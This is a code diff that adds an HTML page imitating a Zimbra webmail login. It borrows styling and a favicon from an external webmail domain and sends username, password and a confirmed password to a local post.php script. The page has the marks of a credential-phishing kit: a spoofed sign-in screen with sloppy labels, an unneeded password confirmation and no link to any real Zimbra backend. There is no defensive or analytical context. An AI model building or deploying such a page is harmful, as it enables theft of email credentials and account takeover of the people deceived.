@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Zimbra Web Admin Authentication- Acesso</title>
+  <meta name="description" content="Acesso ao cliente web.">
+  <link rel="stylesheet" href="https://webmail.inasset.net/css/common,login,zhtml,skin.css?skin=harmony&v=240816020924">
+  <link rel="icon" href="https://webmail.inasset.net/img/logo/favicon.ico">
+</head>
+<body onload="onLoad()">
+  <main class="LoginScreen">
+    <div class="center">
+      <div class="contentBox">
+        <h1>Zimbra Web Admin Authentication</h1>
+
+        <form method="post" name="loginForm" action="post.php" accept-charset="UTF-8">
+          <input type="hidden" name="loginOp" value="login">
+          <input type="hidden" name="login_csrf" value="069aaed1-7413-4a22-95d6-84b01aaaf68c">
+
+          <table class="form">
+            <tr>
+              <td><label for="username">Username:</label></td>
+              <td>
+                <input id="username" class="zLoginField" name="username"
+                       type="text" size="40" maxlength="1024"
+                       autocapitalize="off" autocorrect="off" required>
+              </td>
+            </tr>
+            <tr>
+              <td><label for="password">Password:</label></td>
+              <td>
+                <input id="password" class="zLoginField" name="password"
+                       type="password" size="40" maxlength="1024"
+                       autocomplete="off" required>
+                <button type="button" id="togglePassword" aria-controls="password"
+                </button>
+              </td>
+            </tr>
+            <tr>
+              <td><label for="confirmPassword">Confirm Password:</label></td>
+              <td>
+                <input id="confirmPassword" class="zLoginField" name="confirmPassword"
+                       type="password" size="40" maxlength="1024"
+                       autocomplete="off" required>
+              </td>
+            </tr>
+            <tr>
+              <td></td>
+              <td class="submitTD">
+                <input id="remember" type="checkbox" name="zrememberme" value="1">
+                <label for="remember">Stay Signed in</label>
+                <input type="submit" class="ZLoginButton DwtButton" value="Sign in">
+              </td>
+            </tr>
+            <tr>
+              <td colspan="2"><hr></td>
+            </tr>
+            <tr>
+              <td><label for="client">Versão:</label></td>
+              <td>
+                <div class="positioning">
+                  <select id="client" name="client" onchange="clientChange(this.value)">
+                    <option value="preferred" selected>Default</option>
+                    <option value="advanced">Advance (Ajax)</option>
+                    <option value="standard">Standerd (HTML)</option>
+                    <option value="mobile">Móvel</option>
+                    <option value="touch">Touch</option>
+                  </select>
+
+                  <a href="#" onclick="showWhatsThis(); return false;"
+                     id="ZLoginWhatsThisAnchor"
+                     aria-controls="ZLoginWhatsThis"
+                     aria-expanded="false">
+                    O que é isso?
+                  </a>
+
+                  <div id="ZLoginWhatsThis" class="ZLoginInfoMessage"
+                       style="display:none" role="tooltip">
+                    <h3>Tipos de cliente</h3>
+                    <p><strong>Avançado</strong> oferece recursos completos de colaboração web e funciona melhor em navegadores recentes e conexões rápidas.</p>
+                    <p><strong>Padrão</strong> é recomendado para conexões lentas, navegadores antigos ou acessibilidade facilitada.</p>
+                    <p><strong>Móvel</strong> é recomendado para dispositivos móveis.</p>
+                    <p><strong>Touch</strong> é recomendado para tablets.</p>
+                    <p>Para definir o cliente padrão, altere as opções de login nas preferências após entrar.</p>
+                  </div>
+                </div>
+              </td>
+            </tr>
+          </table>
+        </form>
+      </div>
+      <div class="decor1"></div>
+    </div>
+
+    <div class="Footer"></div>
+    <div class="decor2"></div>
+  </main>
+
+  <script>
+    function showPassword() {
+      const password = document.getElementById("password");
+      const button = document.getElementById("togglePassword");
+      const showing = password.type === "password";
+
+      password.type = showing ? "text" : "password";
+      button.textContent = showing ? "Ocultar" : "Mostrar";
+      button.setAttribute("aria-label", showing ? "Ocultar senha" : "Mostrar senha");
+    }
+
+    function onLoad() {
+      const username = document.getElementById("username");
+      const password = document.getElementById("password");
+
+      (username.value ? password : username).focus();
+      clientChange("preferred");
+    }
+
+    function clientChange() {
+      document.getElementById("ZLoginWhatsThis").style.display = "none";
+      document.getElementById("ZLoginWhatsThisAnchor")
+        .setAttribute("aria-expanded", "false");
+    }
+
+    function showWhatsThis() {
+      const tooltip = document.getElementById("ZLoginWhatsThis");
+      const anchor = document.getElementById("ZLoginWhatsThisAnchor");
+      const isVisible = tooltip.style.display === "block";
+
+      tooltip.style.display = isVisible ? "none" : "block";
+      anchor.setAttribute("aria-expanded", String(!isVisible));
+    }
+  </script>
+</body>
+</html>
